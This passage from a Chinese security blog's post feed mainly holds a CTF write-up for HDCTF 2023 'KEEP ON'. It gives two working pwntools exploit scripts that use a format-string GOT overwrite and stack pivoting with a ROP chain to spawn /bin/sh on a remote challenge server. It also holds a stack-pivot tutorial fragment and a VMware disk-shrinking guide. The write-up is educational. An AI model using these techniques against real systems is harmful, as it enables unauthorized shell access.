punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>至于为什么是 <code>p64(v6_addr + 4)</code></p><p>因为我们这里修改的是 RBP 的值，而寻址的地方是 RBP - 4</p><p>因此，如果我们将 RBP 改为 <code>p64(v6_addr + 4)</code>，那么寻址的地方 RBP - 4 正好就变成了 <code>p64(v6_addr)</code>，<code>scanf()</code> 就会将我们输入的 2024 写到 <code>v6</code> 中了</p><blockquote><p>总结一下：</p><p>如果溢出长度只够覆盖 RBP，那我们是无法控制程序执行流的</p><p>但是可以通过覆盖 RBP 实现栈迁移，利用 <code>scanf()</code> 实现任意地址写（当然前提是有写入权限）</p><p>同理，<code>read()</code> 的寻址也是依赖于 RBP 的，我们也可以用类似的思路实现任意地址读：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_%E6%A0%88%E8%BF%81%E7%A7%BB10.png" alt="CTF - Pwn_栈迁移10.png"></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> 栈迁移 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【HDCTF 2023】KEEP ON</title>
      <link href="/posts/6f874503.html"/>
      <url>/posts/6f874503.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p>结合格式化字符串和栈溢出漏洞，当 <code>printf(s)</code> 只能执行一次时，需想办法让 <code>printf(s)</code> 再执行一次，可以利用栈溢出修改返回地址为 <code>printf(s)</code> 所在的函数。但是<mark>一定要注意输入长度的问题，本题对溢出的长度有要求，只够刚刚好覆盖返回地址，切不可使用 <code>io.sendline(payload)</code></mark></p></li><li><p>使用栈迁移主要是找好迁移的地址，<mark>用迁移的地址覆盖 EBP，用 <code>leave; ret</code> 覆盖返回地址</mark></p></li><li><p><mark>要注意 payload 中 <code>b&#39;/bin/sh&#39;</code> 填的是地址</mark>，如果是我们自己写到栈上的，需要利用泄露的 RSP 或者 RBP 计算其在栈中的偏移，然后得出其真实地址</p></li></ul><hr><p><a href="https://www.nssctf.cn/problem/3774">【HDCTF 2023】 KEEP ON</a></p><hr><h1 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h1><p>查看保护，64 位程序：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/HDCTF2023-KEEP_ON1.png" alt="HDCTF2023-KEEP_ON1.png"></p><p>IDA 分析：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/HDCTF2023-KEEP_ON2.png" alt="HDCTF2023-KEEP_ON2.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/HDCTF2023-KEEP_ON3.png" alt="HDCTF2023-KEEP_ON3.png"></p><p>存在一个像后门的函数，仔细一看好像又不是。。。。。。</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/HDCTF2023-KEEP_ON8.png" alt="HDCTF2023-KEEP_ON8.png"></p><blockquote><p>像极了当时没看清楚，以为真的是后门的我</p><p>利用格式化字符串漏洞将 <code>printf()</code> 的 GOT 表地址改为 <code>shell()</code> 后，只得到了冰冷的四个字母：”flag”（真 · flag）</p></blockquote><p>逻辑不难，主要在于 <code>vuln()</code> 中</p><p>第一个 <code>read()</code> 输入的长度为 0x48，而 <code>s</code> 所在位置为 <code>[rsp+0h] [rbp-50h]</code>，栈的长度为 0x50，我们的输入无法覆盖到返回地址</p><p>可以看到 <code>printf(s)</code> 明显的格式化字符串漏洞，结合程序的 <code>Partial RELRO</code>，可以想到将 <code>printf()</code> 的 GOT 表地址修改为 <code>system()</code></p><p>但是这样修改之后，我们还需要调用一次 <code>printf(s)</code>，通过将 <code>s</code> 写入为 <code>&quot;/bin/sh&quot;</code>，来触发 <code>system(&quot;/bin/sh&quot;)</code></p><p>实际情况是，我们只能使用一次 <code>printf(s)</code>，后面也已经没有 <code>printf(s)</code> 可用了</p><p>不过看到后面还有一个 <code>read()</code>，这次输入的长度为 0x60，<code>s</code> 的栈长 0x50，RBP 占 8 字节，返回地址占 8 字节，<code>0x50 + 8 + 8 = 0x60</code> 正好可以覆盖返回地址</p><p>因此可以考虑通过第二次 <code>read()</code> 覆盖返回地址为 <code>vuln()</code>，这样就可以再执行一次 <code>vuln()</code> 中的 <code>printf(s)</code> 了，正好满足我们格式化字符串漏洞的思想</p><blockquote><p>注意：</p><p>在第一个 <code>read()</code> 处，可输入的最大长度为 0x48，通过调试我们可以看到，我们通过 <code>payload = fmtstr_payload(6, &#123;printf_got_addr: system_addr&#125;)</code> 构造的 payload 实际长度为 40，也就是 0x28，并未超出最大长度</p><p>因此在第一个 payload 发送时，我们使用 <code>io.send()</code> 和 <code>io.sendline()</code> 实际效果没什么区别，因为 payload 最终以 <code>b&#39;\x00&#39;</code> 结尾，另外即使 <code>io.sendline()</code> 追加换行符也不会超过 0x48</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/HDCTF2023-KEEP_ON5.png" alt="HDCTF2023-KEEP_ON5.png"></p><p>但是，利用第二个 <code>read()</code> 覆盖返回地址时就不一样了</p><p>输入的最大长度被限制为 0x60，而我们将返回地址修改为 <code>vuln()</code> 最少需要 0x60 的长度，因此这时我们只能用 <code>io.send()</code> 来发送 payload，不可以再使用 <code>io.sendline()</code> 追加换行符，否则会出错</p></blockquote><hr><h1 id="脚本一"><a href="#脚本一" class="headerlink" title="脚本一"></a>脚本一</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>content <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./hdctf'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.anna.nssctf.cn'</span><span class="token punctuation">,</span> <span class="token number">28438</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./hdctf'</span><span class="token punctuation">)</span>vuln_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'vuln'</span><span class="token punctuation">]</span>printf_got_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"printf_got_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>printf_got_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"system_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'please show me your name: \n'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>printf_got_addr<span class="token punctuation">:</span> system_addr<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment"># debug()</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>   <span class="token comment"># 使用 io.sendline(payload) 也可以</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'keep on !\n'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x50</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>vuln_addr<span class="token punctuation">)</span><span class="token comment"># pause()</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>   <span class="token comment"># 长度被限制，不可以使用 io.sendline(payload)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'please show me your name: \n'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'/bin/sh\x00'</span><span class="token comment"># pause()</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果一"><a href="#结果一" class="headerlink" title="结果一"></a>结果一</h1><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/HDCTF2023-KEEP_ON4.png" alt="HDCTF2023-KEEP_ON4.png"></p><hr><h1 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h1><p>另一种方法就是使用栈迁移</p><p>首先我们需要泄露栈的地址，使用 GDB 调试，在第一个 <code>read()</code> 处输入：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">aaaaaaaa_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后运行到 <code>printf(s)</code> 处：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/HDCTF2023-KEEP_ON6.png" alt="HDCTF2023-KEEP_ON6.png"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">aaaaaaaa_0x7fffffffb9c0_</span><span class="token punctuation">(</span>nil<span class="token punctuation">)</span><span class="token function">_0x7ffff7d14887_0x6_0x6022a0_0x6161616161616161_0x255f70255f70255f_0x5f70255f70255f70_0x70255f70255f7025_0x255f70255f70255f_0x5f70255f70255f70_0x70255f70255f7025_0x255f70255f70255f_0xa70255f70_</span><span class="token punctuation">(</span>nil<span class="token punctuation">)</span><span class="token function">_0x7fffffffdb40_0x400768_0x1_0x7ffff7c29d90_</span><span class="token punctuation">(</span>nil<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/HDCTF2023-KEEP_ON7.png" alt="HDCTF2023-KEEP_ON7.png"></p><p>可以看到 RBP 位于第 16 个位置，因此使用 <code>b&#39;%16$p&#39;</code> 即可泄露 RBP 中存放的地址，这个地址 <code>0x7fffffffdb40</code> 就是上一个 RBP 所在地址，我这里记为 <code>old_rbp_addr</code></p><p>而现在的 RBP 地址为 <code>0x7fffffffdb30</code>，与上一个 RBP 所在位置相距 2 字节，也就是：<code>now_rbp_addr = old_rbp_addr - 0x10</code></p><p><mark>栈迁移的核心在于，将当前的 EBP 覆盖为我们想要将栈迁移过去的地址，然后将返回地址覆盖为 <code>leave; ret</code> 的地址</mark></p><blockquote><p><em>栈迁移的详细原理，见 《<a href="%E6%A0%88%E8%BF%81%E7%A7%BB.md">栈迁移</a>》</em></p></blockquote><p>第二次 <code>read()</code> 时，我们需要计算一下第二次输入的地方与 <code>old_rbp_addr</code> 之间的距离</p><blockquote><p>注意：计算第二次输入的地方与 <code>now_rbp_addr</code> 之间的距离也可以</p><p><strong>这里我们主要是为了得到第二次输入的位置所在的地址</strong>，因为 <code>old_rbp_addr</code> 是直接泄露出来的，方便计算一点而已</p></blockquote><p>为了与前面的 <code>aaaaaaaa</code> 区分开，这次调试我们输入：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">bbbbbbbb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/HDCTF2023-KEEP_ON9.png" alt="HDCTF2023-KEEP_ON9.png"></p><p>计算得第二次输入的地方与 <code>old_rbp_addr</code> 之间的距离为 0x60，也就是与 <code>now_rbp_addr</code> 相距 0x50</p><p>于是，我们可以将栈迁移到：<code>target_addr = old_rbp_addr - 0x60 - 0x08</code>（减的 0x08 是为了覆盖掉原先的返回地址），即：第二次输入的位置所在的地址的上一个内存单元</p><blockquote><p>如果前面计算的是第二次输入的地方与 <code>now_rbp_addr</code> 之间的距离</p><p>那么这里就变为：<code>target_addr = now_rbp_addr - 0x50 - 0x08</code></p></blockquote><p>至于其他的 ROP 所需要用到的参数，这里就不详细说了：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/HDCTF2023-KEEP_ON10.png" alt="HDCTF2023-KEEP_ON10.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/HDCTF2023-KEEP_ON11.png" alt="HDCTF2023-KEEP_ON11.png"></p><blockquote><p>这里可以直接将 <code>b&#39;/bin/sh&#39;</code> 写入栈中，因为我们已知栈的地址，就可以根据栈的地址来定位写入的 <code>b&#39;/bin/sh&#39;</code> 的地址，因此可以不用 libc 偏移来计算 <code>b&#39;/bin/sh&#39;</code> 的地址</p></blockquote><hr><h1 id="脚本二"><a href="#脚本二" class="headerlink" title="脚本二"></a>脚本二</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>content <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./hdctf'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.anna.nssctf.cn'</span><span class="token punctuation">,</span> <span class="token number">28014</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./hdctf'</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"system_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'please show me your name: \n'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'%16$p'</span><span class="token comment"># debug()</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">)</span>old_rbp_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>now_rbp_addr <span class="token operator">=</span> old_rbp_addr <span class="token operator">-</span> <span class="token number">0x10</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"old_rbp_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>old_rbp_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"now_rbp_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>now_rbp_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>target_addr <span class="token operator">=</span> old_rbp_addr <span class="token operator">-</span> <span class="token number">0x60</span> <span class="token operator">-</span> <span class="token number">0x08</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"target_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>target_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>leave_ret <span class="token operator">=</span> <span class="token number">0x4007f2</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x4008d3</span>ret <span class="token operator">=</span> <span class="token number">0x4005b9</span><span class="token comment"># -------------------- 栈 s --------------------</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token comment"># payload += b'/bin/sh\x00'   # 注意：送入 RDI 作为 system 参数的是 b'/bin/sh' 的地址，而不是 b'/bin/sh' 本身</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>target_addr <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">*</span> <span class="token number">5</span><span class="token punctuation">)</span>   <span class="token comment"># target_addr 的下一个地址就是 s 栈中的第一个位置，也就是 payload 中的 p64(pop_rdi_ret)，而 b'/bin/sh\x00' 在栈 s 中的第 5 个位置，因此偏移为 0x8 * 5</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">b'/bin/sh\x00'</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span><span class="token comment"># -------------------- 栈 s --------------------</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>target_addr<span class="token punctuation">)</span>   <span class="token comment"># 当前的 EBP 所在位置，即：now_rbp_addr，填写将栈迁移过去的目标地址</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>   <span class="token comment"># 返回地址，填写 leave; ret </span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果二"><a href="#结果二" class="headerlink" title="结果二"></a>结果二</h1><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/HDCTF2023-KEEP_ON12.png" alt="HDCTF2023-KEEP_ON12.png"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Pwn </tag>
            
            <tag> 格式化字符串 </tag>
            
            <tag> 栈迁移 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记录一些VM虚拟机磁盘压缩回收与拆分合并</title>
      <link href="/posts/2377a1e2.html"/>
      <url>/posts/2377a1e2.html</url>
      
        <content type="html"><![CDATA[<h1 id="压缩-VM-磁盘文件"><a href="#压缩-VM-磁盘文件" class="headerlink" title="压缩 VM 磁盘文件"></a>压缩 VM 磁盘文件</h1><blockquote><p>虚拟机创建后，随着日常使用，物理机中的磁盘文件 vmdk 会越来越大，严重占用主机空间，并且磁盘文件只会增大不会缩小，即使删除虚拟机中的文件，物理机中的磁盘文件 vmdk 也不会减小</p></blockquote><p>首先可以使用 VM 中的压缩磁盘功能，其中碎片整理花费时间可能比较长： （感觉效果不太好）</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8E%8B%E7%BC%A9%20VM%20%E7%A3%81%E7%9B%98%E6%96%87%E4%BB%B61.png" alt="压缩 VM 磁盘文件1.png"></p><p>除此之外，在 VMware Workstation 的安装目录下，有一个 <code>vmware-vdiskmanager.exe</code> 程序</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%8615.png" alt="从物理机拖到Linux虚拟机中的文件消失了15.png"></p><p><strong>注意：使用此方法虚拟机需要挂起或关机，同时虚拟机不能有快照</strong></p><p>在该目录下打开终端，输入：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vmware-vdiskmanager.exe <span class="token parameter variable">-k</span> <span class="token string">"vmdk 文件路径"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果安装虚拟机时选择的是将磁盘存储为多个文件，而非存储为单个文件，则只需选择名为：<code>虚拟机名.vmdk</code> 的那个 vmdk 文件 <em>（文件名不带 s 的那种）</em></p><p>这样就可以使用 <code>vmware-vdiskmanager.exe</code> 程序对 VM 磁盘文件 vmdk 进行压缩</p><p>执行过程会显示压缩进度，完成后会提示：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Shrink: <span class="token number">100</span>% done.Shrink completed successfully.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h1 id="Linux-虚拟机空间回收"><a href="#Linux-虚拟机空间回收" class="headerlink" title="Linux 虚拟机空间回收"></a>Linux 虚拟机空间回收</h1><blockquote><p>有时候使用 <code>vmware-vdiskmanager.exe</code> 压缩的效果也不太好，是因为虚拟机中的一些数据虽然在虚拟机中被删除了，但是并不会回收这部分空间</p><p>参考文章：<a href="https://blog.csdn.net/M_Culture/article/details/108582098">解决VMware中Ubuntu占用空间过大的问题（Ubuntu虚拟机空间回收）ubuntu虚拟机占空间太大-CSDN博客</a></p></blockquote><p>对于 Windows 虚拟机可以通过关机后在 VM 中直接：<code>虚拟机 --&gt; 管理 --&gt; 清理磁盘</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A9%BA%E9%97%B4%E5%9B%9E%E6%94%B62.png" alt="Linux 虚拟机空间回收2.png"></p><p>但是 Linux 系列虚拟机只能通过 VMware 的虚拟机工具来回收空间</p><p><strong>注意：虚拟机不能有快照，否则会显示：“为该虚拟机禁用了磁盘压缩。”</strong></p><p>在虚拟机开机状态下，在终端输入：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> vmware-toolbox-cmd disk list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>会输出可以回收的磁盘：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">//boot/efi   <span class="token comment"># 尽量不要压缩这个，虽然不会造成严重后果，但可能会让系统存在小 Bug</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后针对输出的磁盘，使用如下指令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> vmware-toolbox-cmd disk shrink /<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行该指令后，Linux 虚拟机的终端会显示开始回收，走完里面的进度条之后，会启动物理机中 VMware 的程序开始压缩，也会有进度条，物理机的进度条走完之后就压缩完成了</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A9%BA%E9%97%B4%E5%9B%9E%E6%94%B61.png" alt="Linux 虚拟机空间回收1.png"></p><p>回收完后，虚拟机磁盘 vmdk 文件大小会大幅降低</p><p><mark>注意：回收的过程中磁盘占用会先上升后下降，请保证物理机的磁盘上空间足够再执行这个命令！！ （推荐预留两倍当前虚拟磁盘大小）</mark></p><p><strong>我的 Ubuntu 22.04 直接从 82 GB 变成了 46 GB，整个人都清静了，简直 yyds</strong></p><hr><h1 id="导出-OVF-清除原来占用的磁盘"><a href="#导出-OVF-清除原来占用的磁盘" class="headerlink" title="导出 OVF 清除原来占用的磁盘"></a>导出 OVF 清除原来占用的磁盘</h1><blockquote><p>VMware 有时候删除虚拟机快照出现错误，但是快照图标已经消失，导致无法再通过 VMware 删除该快照，造成文件残留，就这样越堆越多，无法清理</p><p>参考文章：<a href="https://www.cnblogs.com/dingjiaoyang/p/11162299.html">三种方法给Vmware虚拟机占用空间清理瘦身 - 皎陽 - 博客园 (cnblogs.com)</a></p></blockquote><p><mark>这个方法属于杀手锏，在其他方法效果不大的时候使用，比较适用虚拟机空间极度需要清理的情况，将当前虚拟机另存为 OVF 文件，清空原有盘来节省空间</mark></p><p>优点：可以释放大量空间<br>缺点：<strong>只能保留 VMware 虚拟机当前的状态和文件，丢失其他快照</strong> （可以按需先转到某个快照再导出 OVF，这样就可以保留快照时的状态了。同样，会丢失其他快照的状态）</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8E%8B%E7%BC%A9%20VM%20%E7%A3%81%E7%9B%98%E6%96%87%E4%BB%B62.png" alt="压缩 VM 磁盘文件2.png"></p><p>导出后，直接使用 VMware 打开 OVF 文件即可</p><p>如果 OVF 可以正常开机使用，就可以把虚拟机之前的磁盘文件清空释放空间<br>如果虚拟机不正常，可以试试重新导出 OVF</p><hr><h1 id="合并-VM-多磁盘文件为单磁盘文件"><a href="#合并-VM-多磁盘文件为单磁盘文件" class="headerlink" title="合并 VM 多磁盘文件为单磁盘文件"></a>合并 VM 多磁盘文件为单磁盘文件</h1><blockquote><p>在创建虚拟机时，若选择了将硬盘存储为多个文件，后续也可以将多个磁盘文件重新合并为单个文件</p></blockquote><p><mark>首先关闭虚拟机</mark></p><p>硬盘存储为多个文件：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%8616.png" alt="从物理机拖到Linux虚拟机中的文件消失了16.png"></p><p>其中，有一个名字不带 s 的 vmdk 文件 <code>Kali-2022.4.vmdk</code>，大小比其他 vmdk 文件小很多：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%8617.png" alt="从物理机拖到Linux虚拟机中的文件消失了17.png"></p><p>这个文件是用来记录硬盘文件的拆分信息的，将多个硬盘文件联系在一起；而其他的带 s 的 vmdk 文件才是真正用来存储数据的硬盘文件</p><p>在 VMware Workstation 的安装目录下</p><p>使用 <code>vmware-vdiskmanager.exe</code> 程序对多个 VM 磁盘文件 vmdk 进行合并：</p><pre class="line-numbers language-bash" 